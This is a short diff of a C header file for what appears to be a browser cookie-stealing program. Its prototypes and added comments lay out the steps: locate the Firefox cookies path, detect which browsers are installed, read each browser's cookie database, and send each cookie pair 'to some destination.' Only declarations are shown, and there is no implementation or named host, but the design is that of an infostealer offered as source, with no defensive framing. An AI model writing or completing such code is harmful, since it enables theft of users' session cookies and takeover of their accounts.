@@ -27,22 +27,21 @@ typedef struct {
         uint8_t YA;
     } 
 browser_prediction;
-
 #endif
 
+/* main.c prototypes. */
 
-/* Main function prototypes.
-*/
-void dir_reader(const char* directory, char** files);
-
-uint8_t check_file_in_dir(char* filename, const char* dir);
-
+/* Will form Firefox cookies path from current path to ./Profiles. */
 char* get_ff_cookies_path(char* curr_path);
 
+/* Will check what browsers are installed already. */
 browser_prediction check_browsers(char* local, char* roaming);
 
+/* Will execute cookies databases reader for every browser installed. */
 void collect_data(browser_prediction status);
 
+/* Will read cookies databases. */
 void get_sql(const char* sql_path, uint8_t bt);
 
+/* Will send single cookie pair to some destination. */
 uint8_t send_single_cookie(cookies_datatype* c_value);
